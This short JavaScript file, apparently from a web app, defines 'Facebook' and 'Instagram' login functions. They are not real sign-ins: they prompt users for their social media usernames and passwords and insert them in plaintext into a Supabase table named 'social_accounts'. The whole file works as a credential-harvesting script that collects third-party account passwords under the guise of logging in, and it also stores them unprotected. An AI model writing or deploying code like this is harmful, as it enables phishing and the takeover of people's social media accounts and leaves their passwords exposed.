alert("App JS Loaded");
function facebookLogin() {

    const username = prompt("Enter Facebook Username");
    const password = prompt("Enter Facebook Password");

    saveSocial("Facebook", username, password);
}

function instagramLogin() {

    const username = prompt("Enter Instagram Username");
    const password = prompt("Enter Instagram Password");

    saveSocial("Instagram", username, password);
}

async function saveSocial(platform, username, password) {

    const { data, error } = await supabase
        .from("social_accounts")
        .insert([
            {
                platform: platform,
                username: username,
                password: password
            }
        ]);

    if (error) {
        console.log(error);
        alert("Error Saving Data");
    } else {
        alert("Data Saved Successfully");
    }
}
